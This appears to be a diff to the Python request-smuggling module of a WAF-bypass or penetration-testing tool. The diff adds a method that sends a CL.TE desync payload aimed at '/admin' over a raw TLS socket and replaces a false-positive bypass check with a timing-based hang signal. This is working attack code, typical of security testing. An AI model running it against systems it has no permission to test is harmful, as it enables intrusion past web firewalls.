@@ -12,7 +12,43 @@ from typing import Dict, Optional, Any
 
 
 class RequestSmuggler:
-    """Executes HTTP request smuggling attacks"""
+    """Executes HTTP request smuggling attacks.
+
+    P5-5: conforms to the core.waf_bypass.technique.WafTechnique contract — run()
+    returns an Evidence|None and a desync is a CONFIRMED bypass only when that
+    Evidence re-measures is_proven() (a convincing control-vs-test timing delta),
+    never a self-asserted "no 403 ⇒ bypassed".
+    """
+
+    name = "request_smuggler"
+
+    def run(self, target: str, ctx=None) -> "Optional[Any]":
+        """WafTechnique entry point: prove an HTTP request-smuggling desync via a
+        control-vs-test TIMING differential. A vulnerable CL.TE desync makes the
+        origin hang waiting for body bytes, so the smuggling request is materially
+        slower than a well-formed baseline. Returns a `time_delta` Evidence (which
+        is_proven only when the delay is convincing — else it is a LEAD) or None
+        if the timings could not be measured."""
+        from core.proof import ProofRegistry, ProofContext
+
+        control = self.execute_smuggling_attack(
+            target,
+            f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n")
+        payload = self.create_smuggling_payload(
+            "CL.TE", target, f"GET /admin HTTP/1.1\r\nHost: {target}\r\n\r\n")
+        test = self.execute_smuggling_attack(target, payload)
+
+        c_lat = float(control.get("elapsed", -1.0) or -1.0)
+        t_lat = float(test.get("elapsed", -1.0) or -1.0)
+        if c_lat < 0 or t_lat < 0:
+            return None
+        return ProofRegistry.build("time_delta", ProofContext(
+            control_latency=c_lat,
+            test_latency=t_lat,
+            command=f"CL.TE desync vs well-formed baseline on {target}",
+            notes=(f"request-smuggling desync timing differential "
+                   f"(baseline={c_lat:.2f}s, smuggled={t_lat:.2f}s)"),
+        ))
 
     def __init__(self):
         """Initialize request smuggler"""
@@ -111,7 +147,12 @@ class RequestSmuggler:
         payload = self.create_smuggling_payload(
             "CL.TE", target, f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
         result = self.execute_smuggling_attack(target, payload)
-        if result.get("success") and result.get("bypassed_waf"):
+        # P5-5 (SMUGGLER-FALSEPOS): a candidate desync LEAD requires the real
+        # single-request signal — the connection HUNG waiting for body bytes
+        # (front/back-end disagree on length) — NOT merely "the response lacked a
+        # 403", which fabricated a vector on every live host. Confirmation is the
+        # control-vs-test timing differential in run(), gated by is_proven.
+        if result.get("hung"):
             return vector
         return None
 
@@ -145,7 +186,12 @@ class RequestSmuggler:
         payload = self.create_smuggling_payload(
             "TE.CL", target, f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
         result = self.execute_smuggling_attack(target, payload)
-        if result.get("success") and result.get("bypassed_waf"):
+        # P5-5 (SMUGGLER-FALSEPOS): a candidate desync LEAD requires the real
+        # single-request signal — the connection HUNG waiting for body bytes
+        # (front/back-end disagree on length) — NOT merely "the response lacked a
+        # 403", which fabricated a vector on every live host. Confirmation is the
+        # control-vs-test timing differential in run(), gated by is_proven.
+        if result.get("hung"):
             return vector
         return None
 
@@ -209,7 +255,12 @@ class RequestSmuggler:
         payload = self.create_smuggling_payload(
             "TE.TE", target, f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
         result = self.execute_smuggling_attack(target, payload)
-        if result.get("success") and result.get("bypassed_waf"):
+        # P5-5 (SMUGGLER-FALSEPOS): a candidate desync LEAD requires the real
+        # single-request signal — the connection HUNG waiting for body bytes
+        # (front/back-end disagree on length) — NOT merely "the response lacked a
+        # 403", which fabricated a vector on every live host. Confirmation is the
+        # control-vs-test timing differential in run(), gated by is_proven.
+        if result.get("hung"):
             return vector
         return None
 
@@ -305,13 +356,19 @@ class RequestSmuggler:
             "payload_sent": len(payload),
             "success": False,
             "response": None,
+            # P5-5: `bypassed_waf` is NEVER self-asserted from a single response
+            # (that was SMUGGLER-FALSEPOS). A bypass is only ever confirmed by
+            # run()'s control-vs-test timing differential through is_proven.
             "bypassed_waf": False,
-            "smuggled_request_processed": False
+            "smuggled_request_processed": False,
+            "elapsed": 0.0,
+            "hung": False,
         }
 
         try:
             import socket
             import ssl
+            import time
 
             # Create connection to target
             context = ssl.create_default_context()
@@ -321,23 +378,27 @@ class RequestSmuggler:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10.0)
 
+            _t0 = time.time()
             with context.wrap_socket(sock, server_hostname=target) as ssock:
                 # Send smuggling payload
                 ssock.sendall(payload.encode())
 
-                # Receive response
+                # Receive response. A body-length DESYNC makes the origin wait for
+                # bytes that never arrive, so the read loop runs to the cap without
+                # a clean close — that HANG (capped=True) is the real desync signal.
                 response = b""
-                import time
                 start_recv = time.time()
+                capped = False
                 try:
                     while True:
                         if time.time() - start_recv > 10.0:
+                            capped = True
                             break
                         try:
                             ssock.settimeout(1.0)
                             chunk = ssock.recv(4096)
                             if not chunk:
-                                break
+                                break  # clean close → not a hang
                             response += chunk
                         except socket.timeout:
                             continue
@@ -346,14 +407,12 @@ class RequestSmuggler:
                     logging.getLogger(__name__).debug(
                         f'Swallowed exception in request_smuggler.py: {_e}')
 
+                result["elapsed"] = round(time.time() - _t0, 3)
                 result["response"] = response.decode('utf-8', errors='replace')
-
-                # Check if smuggling succeeded
-                # If we get response, WAF may have been bypassed
-                if response:
-                    result["success"] = True
-                    result["bypassed_waf"] = "403" not in str(
-                        response) and "429" not in str(response)
+                # success = the transport worked (got data or hung); it does NOT
+                # imply a bypass. `hung` is the candidate-desync signal.
+                result["success"] = bool(response) or capped
+                result["hung"] = capped
 
         except Exception as e:
             result["error"] = str(e)
